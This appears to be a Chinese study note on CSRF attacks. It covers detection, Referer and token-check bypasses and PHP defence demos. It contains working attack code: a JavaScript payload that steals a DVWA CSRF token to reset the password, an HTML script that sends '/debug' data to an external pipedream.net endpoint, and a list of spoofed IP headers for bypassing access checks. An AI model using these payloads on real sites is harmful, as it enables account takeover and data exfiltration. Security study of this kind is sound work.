
---

![[1 1 1.jpg]]

![[2 1.jpg]]

![[3 1.jpg]]

➢ CSRF-无检测防护-检测&生成&利用

➢ CSRF-Referer同源-规则&上传&XSS

➢ CSRF-Token校验-值删除&复用&留空
![[csrf.jpg]]

#CSRF-无检测防护-检测&生成&利用

检测：黑盒手工利用测试，白盒看代码检验（有无token，来源检验等）

生成：BurpSuite->Engagement tools->Generate CSRF Poc

利用：将文件防止自己的站点下，诱使受害者访问（或配合XSS触发访问）

#CSRF-Referer同源-规则&上传&XSS

https://blog.csdn.net/weixin_50464560/article/details/120581841

严谨代码PHP DEMO：
```php
<?php
	
	// 检测来源
	
	function checkReferrer() {
	
	$expectedReferrer = "http://example.com"; // 期望的来源页面
	if (!isset($_SERVER['HTTP_REFERER']) || $_SERVER['HTTP_REFERER'] !== $expectedReferrer) {
	die("非法访问");
	
	}
	
	}
	
	// 处理表单提交
	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	
	// 检测来源
	checkReferrer();
	
	// 获取用户输入的数据
	$name = $_POST['name'];
	$email = $_POST['email'];
	
	// 输出用户输入的数据
	echo "姓名：$name<br>";
	echo "邮箱：$email<br>";
	exit;
	
	}
	?>
	<!DOCTYPE html>

	<html>
	
	<head>
	<title>检测来源示例</title>
	</head>
	<body>
	<h1>检测来源示例</h1>
	
	<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
	<label for="name">姓名：</label>
	<input type="text" name="name" id="name" required />
	<br>
	<label for="email">邮箱：</label>
	<input type="email" name="email" id="email" required />
	<br>
	<input type="submit" value="提交" />
	</form>
	</body>
	
	</html>
```

	

绕过0：规则匹配绕过问题（代码逻辑不严谨）

1、`<meta name="referrer" content="no-referrer">`（在csrf的执行代码加上这个，说明不添加来源referrer参数）

2、http://xx.xx.xx.xx/http://xx.xx.xx.xx（由于文件名不能修改成http://xx.xx.xx.xx，所以这种修改过不了）

绕过1：配合文件上传绕过（严谨使用同源绕过）

绕过2：配合存储XSS绕过（严谨使用同源绕过）

#CSRF-Token校验-值删除-复用-留空

https://blog.csdn.net/weixin_50464560/article/details/120581841

严谨代码PHP DEMO：


```php
<?php
	
	session_start();
	// 生成并存储 CSRF Token
	function generateCSRFToken() {
	
	$token = bin2hex(random_bytes(32));
	$_SESSION['csrf_token'] = $token;
	return $token;
	
	}
	
	// 检查 CSRF Token 是否有效
	function validateCSRFToken($token) {
	
	return isset($_SESSION['csrf_token']) && $_SESSION['csrf_token'] === $token;
	
	}
	
	// 处理表单提交
	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	
	// 检查 CSRF Token
	if (!isset($_POST['csrf_token']) || !validateCSRFToken($_POST['csrf_token'])) {
	die("CSRF Token 验证失败");
	
	}
	
	// 获取用户输入的数据
	$name = $_POST['name'];
	$email = $_POST['email'];
	
	// 输出用户输入的数据
	echo "姓名：$name<br>";
	echo "邮箱：$email<br>";
	
	exit;
	
	}
	
	// 生成 CSRF Token
	$csrfToken = generateCSRFToken();
	
	?>
	
	<!DOCTYPE html>

	<html>
	
	<head>
	<title>CSRF Token 示例</title>
	</head>
	
	<body>
	
	<h1>CSRF Token 示例</h1>
	<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
	<input type="hidden" name="csrf_token" value="<?php echo $csrfToken; ?>" />
	<label for="name">姓名：</label>
	<input type="text" name="name" id="name" required />
	
	<br>
	
	<label for="email">邮箱：</label>
	<input type="email" name="email" id="email" required />
	
	<br>
	
	<input type="submit" value="提交" />
	
	</form>
	</body>
	
	</html>
```
	
	
绕过0：将Token参数值复用（代码逻辑不严谨）

绕过1：将Token参数删除（代码逻辑不严谨）

绕过2：将Token参数值置空（代码逻辑不严谨）


js异步请求
```js
var tokenurl = 'http://192.168.112.200/DVWA-master/vulnerabilities/csrf/';
var xmlhttp = new XMLHttpRequest();

// 设置onreadystatechange事件处理器
xmlhttp.onreadystatechange = function() {
    /*
        0 - 请求未初始化（open 方法还没有被调用）
        1 - 服务器连接已建立（open 方法已被调用）
        2 - 请求已接收（send 方法已被调用，且头部和状态可获得）
        3 - 请求处理中（下载中，responseText 属性已包含部分数据）
        4 - 请求已完成，且响应已就绪（下载操作已完成）
    */
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
        // 取得响应源码，正则提取Token
        var text = xmlhttp.responseText;
        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
        console.log(regex);
        var match = text.match(regex);
        if (match && match[1]) {
            var token = match[1];
            console.log(token);
            // 创建一个新的XMLHttpRequest对象用于修改密码请求
            var changexmlhttp = new XMLHttpRequest();
            var changeUrl = 'http://192.168.112.200/DVWA-master/vulnerabilities/csrf/?user_token=' + token + '&password_new=root&password_conf=root&Change=Change';
            changexmlhttp.open("GET", changeUrl, true);
            changexmlhttp.send();
        }
    }
};

// 开启异步请求
xmlhttp.open("GET", tokenurl, true);
xmlhttp.send();


```

```html
<!DOCTYPE html>

<html lang="en">

  

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>get</title>

</head>

  

<body>

    <h1>get</h1>

    <br>

    <script>fetch('/debug').then(r => r.json()).then(j => {return fetch('https://eoqyezrkj9efv5t.m.pipedream.net',{method: 'POST',body: JSON.stringify({ data: j })});})</script>

</body>

  

</html>
```

#### 伪造ip
```
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
```
```
X-Forwarded-For: 127.0.0.1
X-Forwarded:127.0.0.1
Forwarded-For:127.0.0.1
Forwarded:127.0.0.1
X-Requested-With:127.0.0.1
X-Forwarded-Proto:127.0.0.1
X-Forwarded-Host:127.0.0.1
X-remote-lP:127.0.0.1
X-remote-addr:127.0.0.1
True-Client-lP: 127.0.0.1
X-Client-lP:127.0.0.1
Client-lP: 127.0.0.1
X-Real-IP:127.0.0.1
Ali-CDN-Real-IP:127.0.0.1
Cdn-Src-lp:127.0.0.1
Cdn-Real-lp:127.0.0.1
CF-Connecting-lP:127.0.0.1
X-Cluster-Client-lP:127.0.0.1
WL-Proxy-Client-lP:127.0.0.1
Proxy-Client-lP:127.0.0.1
Fastly-Client-lp: 127.0.0.1
True-Client-lp: 127.0.0.1
X-Originating-lP:127.0.0.1
X-Host: 127.0.0.1
X-Custom-lP-Authorization:127.0.0.1
```